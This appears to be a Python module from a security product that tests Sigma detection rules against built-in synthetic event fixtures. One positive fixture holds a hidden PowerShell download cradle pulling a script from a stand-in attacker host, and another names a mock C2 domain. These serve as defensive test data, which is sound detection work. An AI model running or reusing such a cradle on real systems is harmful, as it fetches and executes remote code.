"""CyberSentinel AI — Safe Sigma Rule Testing Framework (Sprint 19)
Governing Decisions: ADR-0004, ADR-0005, Phase 19 Specification
"""

import logging
import time
from datetime import timedelta
from typing import Any, Dict, List, Optional

from sqlalchemy import select
from sqlalchemy.orm import Session

from services.detection.compiler import CompiledSigmaRule, SigmaCompilationError, SigmaCompiler
from services.detection.models import RuleTestRequest, RuleTestResult, utc_now
from services.persistence.models import EventMetadata

logger = logging.getLogger("cybersentinel.detection.testing")


def _make_canonical_event(
    event_id: str,
    event_type: str,
    source_type: str = "windows",
    source_name: str = "sysmon",
    process_name: Optional[str] = None,
    command_line: Optional[str] = None,
    parent_process: Optional[str] = None,
    username: Optional[str] = None,
    src_ip: Optional[str] = None,
    dst_ip: Optional[str] = None,
    domain: Optional[str] = None,
    entities: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Helper to generate a normalized event dictionary for fixture evaluation."""
    now = utc_now().isoformat()
    ev: Dict[str, Any] = {
        "event_id": event_id,
        "timestamp": now,
        "ingest_timestamp": now,
        "source_type": source_type,
        "source_name": source_name,
        "event_type": event_type,
        "process_name": process_name,
        "command_line": command_line,
        "parent_process": parent_process,
        "username": username or "SYSTEM",
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "domain": domain,
        "severity": "low",
        "entities": entities or {},
    }
    return {k: v for k, v in ev.items() if v is not None}


def get_default_sample_fixtures() -> List[Dict[str, Any]]:
    """Curated built-in positive and negative test fixtures covering common attack patterns."""
    fixtures = [
        # POSITIVE 1: Suspicious PowerShell Download Cradle
        {
            "_fixture_type": "positive",
            "_fixture_category": "powershell_download",
            **_make_canonical_event(
                event_id="fix-pos-ps-1",
                event_type="process_creation",
                process_name="powershell.exe",
                command_line="powershell.exe -nop -w hidden -c (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
                parent_process="cmd.exe",
                username="victim_user",
            ),
        },
        # POSITIVE 2: Reconnaissance whoami execution
        {
            "_fixture_type": "positive",
            "_fixture_category": "recon_whoami",
            **_make_canonical_event(
                event_id="fix-pos-whoami-1",
                event_type="process_creation",
                process_name="whoami.exe",
                command_line="whoami.exe /priv",
                parent_process="cmd.exe",
                username="victim_user",
            ),
        },
        # POSITIVE 3: Suspicious DNS beaconing
        {
            "_fixture_type": "positive",
            "_fixture_category": "dns_beaconing",
            **_make_canonical_event(
                event_id="fix-pos-dns-1",
                event_type="dns_query",
                source_type="network",
                source_name="zeek",
                domain="c2-beacon-malicious.xyz",
                src_ip="192.168.1.50",
            ),
        },
        # POSITIVE 4: Failed root authentication
        {
            "_fixture_type": "positive",
            "_fixture_category": "auth_failure",
            **_make_canonical_event(
                event_id="fix-pos-auth-1",
                event_type="authentication",
                source_type="linux",
                source_name="auditd",
                username="root",
                src_ip="10.0.0.99",
                entities={"auth_status": "failed", "classification": "auth_failed"},
            ),
        },
        # NEGATIVE 1: Legitimate PowerShell provisioning script
        {
            "_fixture_type": "negative",
            "_fixture_category": "powershell_download",
            **_make_canonical_event(
                event_id="fix-neg-ps-admin",
                event_type="process_creation",
                process_name="powershell.exe",
                command_line="powershell.exe -ExecutionPolicy Bypass -File C:\\Program Files\\IT\\setup.ps1",
                parent_process="svchost.exe",
                username="AdminProvisioningUser",
            ),
        },
        # NEGATIVE 2: Legitimate system process activity
        {
            "_fixture_type": "negative",
            "_fixture_category": "benign_system",
            **_make_canonical_event(
                event_id="fix-neg-svchost",
                event_type="process_creation",
                process_name="svchost.exe",
                command_line="svchost.exe -k netsvcs -p -s BITS",
                parent_process="services.exe",
                username="NT AUTHORITY\\SYSTEM",
            ),
        },
        # NEGATIVE 3: Legitimate internal DNS query
        {
            "_fixture_type": "negative",
            "_fixture_category": "dns_beaconing",
            **_make_canonical_event(
                event_id="fix-neg-dns-internal",
                event_type="dns_query",
                source_type="network",
                source_name="zeek",
                domain="dc01.corp.internal",
                src_ip="192.168.1.10",
            ),
        },
        # NEGATIVE 4: Successful user authentication
        {
            "_fixture_type": "negative",
            "_fixture_category": "auth_failure",
            **_make_canonical_event(
                event_id="fix-neg-auth-ok",
                event_type="authentication",
                source_type="linux",
                source_name="auditd",
                username="standard_analyst",
                src_ip="10.0.0.25",
                entities={"auth_status": "success", "classification": "auth_success"},
            ),
        },
    ]
    return fixtures


class SafeRuleTester:
    """Safely evaluates candidate Sigma rules against synthetic and historical event fixtures."""

    def __init__(self, compiler: Optional[SigmaCompiler] = None):
        self.compiler = compiler or SigmaCompiler()

    def test_rule(
        self,
        request: RuleTestRequest,
        db_session: Optional[Session] = None,
    ) -> RuleTestResult:
        """Execute bounded in-memory evaluation of a candidate Sigma rule."""
        start_time = time.perf_counter()

        # 1. Compile rule in-memory
        try:
            compiled_rule: CompiledSigmaRule = self.compiler.compile_from_yaml(request.rule_yaml)
        except SigmaCompilationError as err:
            duration_ms = round((time.perf_counter() - start_time) * 1000, 2)
            return RuleTestResult(
                rule_id="compilation_failed",
                total_events_evaluated=0,
                matched_event_ids=[],
                passed_positive_fixtures=False,
                passed_negative_fixtures=True,
                false_positives_detected=0,
                coverage_gaps=[f"Rule failed to compile: {err}"],
                execution_time_ms=duration_ms,
                limitations=["Compilation error prevented test evaluation."],
            )

        # 2. Assemble test events
        events_to_test: List[Dict[str, Any]] = []

        # A. Built-in sample fixtures
        if request.use_sample_fixtures:
            events_to_test.extend(get_default_sample_fixtures())

        # B. User-provided fixtures
        if request.fixtures:
            for f in request.fixtures:
                events_to_test.append(f)

        # C. Historical events from DB (if requested and authorized)
        if request.historical_time_window_minutes and db_session:
            cutoff = utc_now() - timedelta(minutes=request.historical_time_window_minutes)
            stmt = (
                select(EventMetadata)
                .where(EventMetadata.event_time >= cutoff)
                .order_by(EventMetadata.event_time.desc())
                .limit(request.max_events)
            )
            db_events = db_session.execute(stmt).scalars().all()
            for dbev in db_events:
                events_to_test.append({
                    "_fixture_type": "historical",
                    "event_id": dbev.id,
                    "timestamp": dbev.event_time.isoformat(),
                    "source_type": "windows",
                    "source_name": dbev.source_id,
                    "event_type": "telemetry",
                    "classification": dbev.classification,
                })

        # Enforce hard bounding limit
        events_to_test = events_to_test[: request.max_events]

        # 3. Evaluate compiled rule against assembled event corpus
        matched_event_ids: List[str] = []
        positive_matches = 0
        positive_expected = 0
        false_positives = 0
        coverage_gaps: List[str] = []

        for ev in events_to_test:
            fix_type = ev.get("_fixture_type", "custom")
            eid = str(ev.get("event_id") or "unknown")

            if fix_type == "positive":
                positive_expected += 1

            matched = compiled_rule.evaluate(ev)
            if matched:
                matched_event_ids.append(eid)
                if fix_type == "positive":
                    positive_matches += 1
                elif fix_type == "negative":
                    false_positives += 1

        # 4. Determine pass/fail indicators
        passed_positive = (positive_matches > 0) if positive_expected > 0 else True
        passed_negative = (false_positives == 0)

        if positive_expected > 0 and positive_matches == 0:
            coverage_gaps.append(
                f"Rule matched 0 of {positive_expected} applicable positive attack fixtures. Condition may be overly narrow."
            )

        if false_positives > 0:
            coverage_gaps.append(
                f"Rule matched {false_positives} benign/negative test fixtures. Additional filters or exclusions required."
            )

        duration_ms = round((time.perf_counter() - start_time) * 1000, 2)

        return RuleTestResult(
            rule_id=compiled_rule.id,
            total_events_evaluated=len(events_to_test),
            matched_event_ids=matched_event_ids,
            passed_positive_fixtures=passed_positive,
            passed_negative_fixtures=passed_negative,
            false_positives_detected=false_positives,
            coverage_gaps=coverage_gaps,
            execution_time_ms=duration_ms,
            limitations=[
                "Synthetic fixture testing evaluates logical condition validity only.",
                "Production effectiveness, precision, and recall cannot be guaranteed solely from synthetic benchmarks.",
                "Live telemetry evaluation requires representative real-world baseline data.",
            ],
        )


# Global default tester
safe_rule_tester = SafeRuleTester()

__all__ = ["SafeRuleTester", "safe_rule_tester", "get_default_sample_fixtures"]
